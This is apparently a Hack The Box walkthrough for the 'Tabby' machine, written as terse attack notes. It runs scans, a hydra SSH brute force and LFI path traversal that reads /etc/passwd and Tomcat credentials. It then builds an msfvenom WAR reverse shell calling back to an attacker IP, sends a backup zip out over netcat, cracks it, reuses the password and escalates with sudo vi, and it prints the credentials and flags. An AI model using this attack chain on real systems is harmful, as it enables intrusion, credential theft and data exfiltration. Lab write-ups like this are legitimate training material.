1. nmap

nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.194
Output: nmap-output.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Went to 10.10.10.194 on Firefox

- Only 1 link "working" --> Click on `news`, sent to http://megahosting.htb/news.php?file=statement

Options

gobuster - running
wfuzz txt files - nothing
wfuzz php- nothing
wfuzz with no file extension - just had the "statement" file.
Statement:

We apologise to all our customers for the previous data breach.

We have changed the site to remove this tool, and have invested heavily in more secure servers

dirsearch
dirsearch -u 10.10.10.194 -e *
Output: dirsearch-output.txt

-- I see a htaccess-marco
Let's try marco as the username for hydra.

kali@kali:~/labs/hackthebox/Tabby/files$ hydra -l marco -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.10.194
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-02 17:23:47
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.10.194:22/
[ERROR] target ssh://10.10.10.194:22/ does not support password authentication (method reply 4).

So must be through SSH key only.

wfuzz 10.10.10.194/news.php?file=FUZZ

Tried Local File Inclusion (LFI):

http://10.10.10.194/news.php?file=../../../../../etc/passwd

Got back the file!
Output: passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
`_`apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash

Found a user "ash"

Go to 10.10.10.194:8080:
Output - 8080-output.txt

view-source:http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
Output: tomcat-users.xml

We have:
username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"

Type that in to http://10.10.10.194:8080/host-manager/html
Then go to Server Status

Server Information
Tomcat Version 	JVM Version 	JVM Vendor 	OS Name 	OS Version 	OS Architecture 	Hostname 	IP Address
Apache Tomcat/9.0.31 (Ubuntu) 	11.0.7+10-post-Ubuntu-3ubuntu1 	Ubuntu 	Linux 	5.4.0-31-generic 	amd64 	tabby 	127.0.1.1

Tried:
https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
-- Tomcat War Deployer Script failed
-- Tomcat Manager Authenticated Upload Code Execution failed (incorrect credentials)
-- Generate .war Format Backdoor:
1. Create Payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f WAR > exploit.war

2. Upload to 8080 using https://gist.github.com/pete911/6111816, https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00

url --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://megahosting.htb:8080/manager/text/deploy?path=/exploit.war&update=true"

3. Run nc -lvnp 4444 on another terminal

4. Run curl "http://megahosting.htb:8080/exploit.war/"

5. Reverse shell!
rows 54; columns 114;
Ctrl+Z
stty raw -echo
fg
reset

Found a backup zip that was password protected.

To Download:

Victim Machine
nc 10.10.14.24 6666 -w 3 < 16162020_backup.zip

Kali
nc -lvnp 6666 > backup.zip

To crack password:
fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt backup.zip

Output: PASSWORD FOUND!!!!: pw == admin@it

But...nothing inside the backup file.

---
Noticed something: ash owns backup file. So maybe that is ash's password?
su ash
admin@it

Worked!

ash@tabby:~$ cat user.txt
e3b86d6d2c0bcea45bf86feeeab26433

ash@tabby:/var/www/html/files$ sudo -l
Matching Defaults entries for ash on tabby:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ash may run the following commands on tabby:
    (ALL) NOPASSWD: ALL

Found a linuxprivchecker.py in home folder.
Ran, found you can do

sudo vi
:!bash

and you're root!

root@tabby:/home/ash# cat /root/root.txt
9c3dde8c0a87c37656f7450208ad08ee
